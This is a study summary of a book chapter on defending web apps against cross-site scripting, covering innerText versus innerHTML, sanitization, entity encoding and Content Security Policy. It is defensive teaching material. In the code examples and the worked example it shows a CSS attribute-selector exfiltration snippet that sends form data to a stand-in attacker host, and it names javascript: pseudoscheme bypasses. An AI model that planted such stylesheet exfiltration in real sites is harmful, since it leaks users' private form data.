# Chapter 43: Defending Against XSS Attacks

## Core Idea
XSS is widespread but usually easy to prevent: never let unsanitized user data enter the DOM as anything but a string, avoid known script-execution sinks, entity-encode display text, and layer a restrictive Content Security Policy (CSP) on top as defense in depth.

## Frameworks Introduced
- **"String-only DOM injection" rule**: The core anti-XSS coding rule — user-supplied data should never be passed into the DOM except as a string, and ideally only after sanitization.
  - When to use: Any time user-submitted data must be rendered in the page.
  - How: Prefer `innerText` over `innerHTML` when HTML structure isn't required; when HTML must be allowed selectively, extensively sanitize and escape rather than trusting a blocklist.
- **CSP script-src allowlisting**: Browser-enforced restriction on which origins scripts may load from.
  - When to use: As an early architectural decision, ideally decided before development starts once you know your app's script sources.
  - How: Set `Content-Security-Policy: script-src "self" https://api.your-domain.com` via response header or `<meta>` tag; avoid wildcard host allowlisting (`https://*.your-domain.com`) since future subdomains may accept user-uploaded content.
- **Disabling unsafe-inline / unsafe-eval**: CSP's default posture disables inline scripts and string-to-code evaluation; these must be deliberately re-enabled, which the chapter recommends against.
  - When to use: Whenever CSP is enabled — leave these off by default rather than adding them for convenience.
  - How: Rewrite `eval`-like patterns (e.g., string-based `setTimeout`) as function references instead of interpreted strings.

## Key Concepts
- **DOM sink**: Any API that converts text into DOM or executable script, making it a natural target for XSS payload execution (`innerHTML`, `Blob`, SVG, `document.write`, `DOMParser.parseFromString`, `document.implementation`).
- **String-like value**: A string or number, distinguished from complex objects via a `JSON.stringify(JSON.parse(x)) === x` check, since both are safe for DOM injection as text.
- **JavaScript pseudoscheme**: A URL scheme (`javascript:...`) that allows script execution without script tags or quotes, bypassing naive quote/tag-based sanitizers.
- **HTML entity encoding**: Converting the "big five" special characters into their HTML entity representations so they render as text instead of being interpreted as markup.
- **CSS XSS / CSS-based exfiltration**: Using CSS attribute selectors plus `background:url()` to trigger conditional outbound HTTP GET requests that leak form state to an attacker-controlled domain.
- **script-src**: The CSP directive controlling which origins are permitted as sources for dynamically loaded scripts.

## Mental Models
- Think of `innerText` vs `innerHTML` as "text mode" vs "markup mode" — use text mode by default and reserve markup mode for cases with a real, vetted need for structural HTML.
- Treat sanitization as inherently incomplete: "complete sanitization is extremely hard" — favor structural techniques (dummy `<a>` element sanitization, `encodeURIComponent`) that reuse the browser's own well-tested filtering over hand-rolled blocklists.
- Use CSP as a first line of defense against externally injected scripts, but recognize it does not protect against DOM XSS from your own trusted, already-loaded scripts misusing a sink.
- Treat CSS as a legitimate, if unusual, exfiltration channel whenever user-uploaded stylesheets are allowed — it doesn't execute arbitrary JS, but it can still leak form data via conditional background image requests.

## Anti-patterns
- **Using `innerHTML` for plain-text display**: Interprets HTML tags as DOM rather than as string content, opening a direct XSS injection path where `innerText` would have been safe.
- **Blocklisting quotes/script tags as your sanitizer**: Fails against the JavaScript pseudoscheme (`javascript:alert(...)`) and `String.fromCharCode()`-based payloads that need neither quotes nor script tags.
- **Allowing arbitrary user-uploaded CSS**: Enables data exfiltration via `background:url()` conditional selectors even without JavaScript execution.
- **Wildcard CSP script-src allowlisting** (`https://*.your-domain.com`): Looks safe today but silently expands the trusted surface to any future subdomain, including ones that later accept user-uploaded scripts.
- **Enabling `unsafe-inline`/`unsafe-eval` for convenience**: Defeats CSP's core mitigation against scripts injected into (or stored on) your own trusted origin.

## Code Examples
```javascript
// Less safe: tags interpreted as DOM
const userString = '<strong>hello, world!</strong>';
const div = document.querySelector('#userComment');
div.innerHTML = userString;

// More safe: tags interpreted as strings
const userString2 = '<strong>hello, world!</strong>';
const div2 = document.querySelector('#userComment');
div2.innerText = userString2;
```
- **What it demonstrates**: `innerText` sanitizes HTML-looking content into plain text by default, whereas `innerHTML` renders it as live markup.

```javascript
const dummy = document.createElement('a');
dummy.href = userLink;
window.location.href = `https://mywebsite.com/${dummy.a}`;
// goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong
```
- **What it demonstrates**: Reusing the browser's own well-tested `<a>` tag href sanitization (by writing into a throwaway anchor element) rather than hand-rolling URL sanitization logic.

```css
#income[value=">100k"] {
  background: url("https://www.hacker.com/incomes?amount=gte100k");
}
```
- **What it demonstrates**: CSS attribute-selector-conditioned `background:url()` leaking form field state to an attacker's server via an implicit GET request — no JavaScript required.

```
Content-Security-Policy: script-src "self" https://api.mega-bank.com
```
- **What it demonstrates**: A CSP header allowlisting only the current origin ("self") and one explicit API subdomain as valid script sources.

## Reference Tables
### Table 28-1. Entity Encoding's Big Five Characters

| Character | Entity encoded |
|---|---|
| & | &amp;amp; |
| < | &amp;lt; |
| > | &amp;gt; |
| " | &amp;#034; |
| ' | &amp;#039; |

### CSS Attack Mitigation Options (by rigor)

| Difficulty | Mitigation |
|---|---|
| Easy | Disallow user-uploaded CSS entirely |
| Medium | Allow only specific fields to be modified by the user; generate the actual stylesheet server-side from those fields |
| Hard | Sanitize any HTTP-initiating CSS attributes (e.g., `background:url`) |

## Worked Example
A site lets users upload a custom stylesheet to personalize their profile page, which other users' browsers download when visiting that profile — a legitimate-seeming feature parallel to a comment form. An attacker crafts a stylesheet using an attribute selector tied to a sensitive form field on the page (e.g., an income field): `#income[value=">100k"] { background:url("https://hacker.com/incomes?amount=gte100k"); }`. When a victim with income ">100k" views a page where this stylesheet applies and their form reflects that value, the browser issues a `background:url()`-triggered GET request to the attacker's server, silently leaking the sensitive field's state — entirely through CSS, without any JavaScript execution.

The defense proceeds through the three-tier mitigation ladder: the easiest fix is simply disallowing user-uploaded stylesheets altogether. If custom styling is a required feature, the medium-effort fix restricts users to submitting values for a fixed set of fields (e.g., "accent color," "font"), which the server then uses to generate a safe stylesheet itself — the user never controls raw CSS text. Only as a last resort would the team attempt to sanitize HTTP-initiating attributes like `background:url` directly, since CSS's rich spec makes this fragile and hard to guarantee complete.

## Key Takeaways
1. Default to treating all user-supplied DOM content as untrusted text (`innerText`), not markup (`innerHTML`), unless there's a vetted reason otherwise.
2. Blocklisting quotes and script tags is not sufficient sanitization — the JavaScript pseudoscheme and `String.fromCharCode()` bypass it.
3. Reuse browser-native sanitization (dummy `<a>` elements, `encodeURIComponent`) over hand-rolled filters wherever possible.
4. Apply HTML entity encoding for the "big five" characters, but remember it does not protect content inside `<script>`, CSS, or URLs.
5. Disallow user-uploaded CSS by default; it's a legitimate exfiltration channel via `background:url()` even without JS execution.
6. Configure CSP `script-src` as an allowlist from day one of development, and never enable `unsafe-inline`/`unsafe-eval`.
7. Treat CSP as necessary but not sufficient — it stops externally injected scripts but not DOM XSS from your own trusted sinks.

## Connects To
- **Chapter 10 (offense): Cross-Site Scripting**: This chapter is the direct defense pairing for the XSS attack techniques (stored, reflected, DOM-based) built there.
- **Chapter 44: Defending Against CSRF Attacks**: Both chapters rely on the same underlying principle — browser-enforced boundaries (origin checks, CSP) as structural defenses that don't depend on catching every bad input by hand.
- **OWASP Top 10 (external concept)**: XSS remains a perennial entry; the defenses here map directly onto standard OWASP mitigation guidance.
